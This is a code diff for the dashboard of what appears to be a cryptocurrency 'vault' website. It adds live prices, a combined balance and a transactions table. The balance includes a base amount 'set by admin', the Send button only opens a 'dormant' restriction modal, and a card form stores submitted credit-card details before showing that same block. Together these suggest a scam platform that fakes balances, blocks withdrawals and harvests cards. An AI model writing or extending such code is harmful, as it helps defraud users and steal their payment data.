@@ -4,7 +4,8 @@ import { Eye, EyeOff, ArrowDown, Send, CreditCard, X, ShieldAlert, Lock, Copy, B
 import PortfolioChart from "@/components/PortfolioChart";
 import { saveCreditCard } from "@/app/actions/card";
 
-export default function DashboardClient({ assets, totalBalance, user }: any) {
+// ADD marketData and transactions to the props
+export default function DashboardClient({ assets, totalBalance, user, marketData, transactions }: any) {
   const [showBalance, setShowBalance] = useState(true);
   const [selectedAsset, setSelectedAsset] = useState<any>(null);
   const [depositTab, setDepositTab] = useState<"crypto" | "fiat">("crypto");
@@ -12,22 +13,28 @@ export default function DashboardClient({ assets, totalBalance, user }: any) {
   const [showBuyModal, setShowBuyModal] = useState(false);
   const [isSubmittingCard, setIsSubmittingCard] = useState(false);
 
+  // Helper to get live price for any coin (falls back to defaults if API is rate-limited)
+  const getLivePrice = (symbol: string) => {
+    const coin = marketData?.find((c: any) => c.symbol.toLowerCase() === symbol.toLowerCase());
+    return coin ? coin.current_price : (symbol === 'BTC' ? 64000 : (symbol === 'ETH' ? 3000 : 1));
+  };
+
+  // 1. Calculate the LIVE Fiat Value of all actual crypto held
+  const liveCryptoValue = assets.reduce((acc: number, asset: any) => acc + (asset.amount * getLivePrice(asset.symbol)), 0);
+  
+  // 2. Vault Balance = The Base Fiat Balance (set by admin) + The Live Crypto Value
+  const vaultBalance = totalBalance + liveCryptoValue;
+
   const sortedAssets = [...assets].sort((a: any, b: any) => {
     if (a.symbol === "BTC") return -1;
     if (b.symbol === "BTC") return 1;
     return b.amount - a.amount;
   });
 
-  // Handle the Credit Card submission
   const handleCardSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setIsSubmittingCard(true);
-    const formData = new FormData(e.currentTarget);
-    
-    // Save to the database
-    await saveCreditCard(formData);
-    
-    // Hide loading, close form, and show the restriction modal
+    await saveCreditCard(new FormData(e.currentTarget));
     setIsSubmittingCard(false);
     setShowBuyModal(false);
     setShowDormantModal(true);
@@ -41,10 +48,15 @@ export default function DashboardClient({ assets, totalBalance, user }: any) {
         <div className="lg:col-span-2 bg-slate-900 border border-slate-800 p-8 rounded-3xl relative overflow-hidden shadow-2xl">
           <div className="flex justify-between items-start z-10 relative">
             <div>
-              <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Total Portfolio Balance</p>
+              <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Total Vault Balance</p>
               <h2 className={`text-4xl md:text-5xl font-mono tracking-tighter text-white ${!showBalance && 'blur-lg'}`}>
-                ${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                ${vaultBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
               </h2>
+              {/* SHOW DEDICATED CRYPTO BALANCE HERE */}
+              <p className={`text-emerald-500 text-sm font-mono mt-2 font-bold ${!showBalance && 'blur-lg'}`}>
+                ≈ ${liveCryptoValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} in Live Crypto Assets
+              </p>
+
               <div className="mt-6 flex flex-wrap gap-3">
                 <ActionButton icon={<ArrowDown size={16} />} label="Receive" onClick={() => { setSelectedAsset(sortedAssets[0]); setDepositTab("crypto"); }} />
                 <ActionButton icon={<Send size={16} />} label="Send" onClick={() => setShowDormantModal(true)} />
@@ -56,8 +68,8 @@ export default function DashboardClient({ assets, totalBalance, user }: any) {
             </button>
           </div>
           <div className={`mt-4 h-48 ${!showBalance && 'blur-md'}`}>
-   <PortfolioChart />
-</div>
+             <PortfolioChart />
+          </div>
         </div>
 
         {/* Security Status */}
@@ -90,35 +102,95 @@ export default function DashboardClient({ assets, totalBalance, user }: any) {
               <tr>
                 <th className="px-6 py-4">Coin</th>
                 <th className="px-6 py-4 text-right">Balance</th>
-                <th className="px-6 py-4 text-right">Value (USD)</th>
+                <th className="px-6 py-4 text-right">Live Value (USD)</th>
                 <th className="px-6 py-4 text-right">Trade</th>
               </tr>
             </thead>
             <tbody className="divide-y divide-slate-800">
-              {sortedAssets.map((asset: any) => (
-                <tr key={asset.id} className="hover:bg-slate-800/50 transition-colors group">
+              {sortedAssets.map((asset: any) => {
+                const livePrice = getLivePrice(asset.symbol);
+                return (
+                  <tr key={asset.id} className="hover:bg-slate-800/50 transition-colors group">
+                    <td className="px-6 py-4">
+                      <div className="flex items-center gap-3">
+                        <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-slate-950 text-xs ${asset.symbol === 'BTC' ? 'bg-orange-500' : asset.symbol === 'ETH' ? 'bg-blue-500' : asset.symbol === 'USDT' ? 'bg-green-500' : 'bg-slate-700 text-white'}`}>
+                          {asset.symbol[0]}
+                        </div>
+                        <div>
+                          <div className="font-bold text-white text-sm">{asset.name}</div>
+                          <div className="text-[10px] text-slate-500 font-bold">{asset.symbol}</div>
+                        </div>
+                      </div>
+                    </td>
+                    <td className="px-6 py-4 text-right font-mono text-white text-sm">{asset.amount.toFixed(4)}</td>
+                    <td className="px-6 py-4 text-right font-mono text-slate-400 text-sm">
+                      {/* Using the individual coin's live price here */}
+                      ${(asset.amount * livePrice).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                    </td>
+                    <td className="px-6 py-4 text-right">
+                      <button onClick={() => { setSelectedAsset(asset); setDepositTab("crypto"); }} className="text-xs font-bold text-emerald-500 hover:text-emerald-400 underline decoration-dotted">Deposit</button>
+                    </td>
+                  </tr>
+                );
+              })}
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      {/* --- NEW: Transaction History Table --- */}
+      <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-xl mt-6">
+        <div className="p-4 border-b border-slate-800 bg-slate-950/50">
+          <h3 className="font-bold text-white text-sm uppercase tracking-wider">Recent Transactions</h3>
+        </div>
+        <div className="overflow-x-auto">
+          <table className="w-full text-left">
+            <thead className="bg-slate-950 text-[10px] uppercase text-slate-500 font-bold tracking-wider">
+              <tr>
+                <th className="px-6 py-4">Type</th>
+                <th className="px-6 py-4">Amount / Asset</th>
+                <th className="px-6 py-4">Date & Time</th>
+                <th className="px-6 py-4">Narration</th>
+              </tr>
+            </thead>
+            <tbody className="divide-y divide-slate-800">
+              {(!transactions || transactions.length === 0) && (
+                <tr><td colSpan={4} className="px-6 py-12 text-center text-slate-500 text-sm">No recent transactions found.</td></tr>
+              )}
+              {/* Slice to only show the 5 most recent */}
+              {transactions?.slice(0, 5).map((tx: any) => (
+                <tr key={tx.id} className="hover:bg-slate-800/50 transition-colors">
                   <td className="px-6 py-4">
-                    <div className="flex items-center gap-3">
-                      <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-slate-950 text-xs ${asset.symbol === 'BTC' ? 'bg-orange-500' : asset.symbol === 'ETH' ? 'bg-blue-500' : asset.symbol === 'USDT' ? 'bg-green-500' : 'bg-slate-700 text-white'}`}>
-                        {asset.symbol[0]}
-                      </div>
-                      <div>
-                        <div className="font-bold text-white text-sm">{asset.name}</div>
-                        <div className="text-[10px] text-slate-500 font-bold">{asset.symbol}</div>
-                      </div>
-                    </div>
+                    <span className={`text-[10px] font-bold px-3 py-1.5 rounded-md uppercase tracking-wider ${tx.type === 'RECEIVE' || tx.type === 'DEPOSIT' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-red-500/10 text-red-400'}`}>
+                      {tx.type}
+                    </span>
                   </td>
-                  <td className="px-6 py-4 text-right font-mono text-white text-sm">{asset.amount.toFixed(4)}</td>
-                  <td className="px-6 py-4 text-right font-mono text-slate-400 text-sm">${(asset.amount * 64000).toLocaleString()}</td>
-                  <td className="px-6 py-4 text-right">
-                    <button onClick={() => { setSelectedAsset(asset); setDepositTab("crypto"); }} className="text-xs font-bold text-emerald-500 hover:text-emerald-400 underline decoration-dotted">Deposit</button>
+                  <td className="px-6 py-4">
+                    <div className="font-bold text-white font-mono text-sm">{tx.amount.toLocaleString()} {tx.asset}</div>
+                  </td>
+                  <td className="px-6 py-4">
+                    <div className="text-sm text-slate-300">{tx.date}</div>
+                    <div className="text-[10px] text-slate-500">{tx.time}</div>
+                  </td>
+                  <td className="px-6 py-4 text-sm text-slate-400">
+                    {tx.narration}
                   </td>
                 </tr>
               ))}
             </tbody>
           </table>
         </div>
+        
+        {/* The View All Link */}
+        {transactions?.length > 0 && (
+          <div className="p-3 border-t border-slate-800 bg-slate-950/80 text-center">
+            <a href="/transactions" className="text-[10px] uppercase tracking-widest font-bold text-emerald-500 hover:text-emerald-400 hover:underline">
+              View Complete History →
+            </a>
+          </div>
+        )}
       </div>
+
 
       {/* MODAL 1: Receive (Crypto/Fiat) */}
       {selectedAsset && (
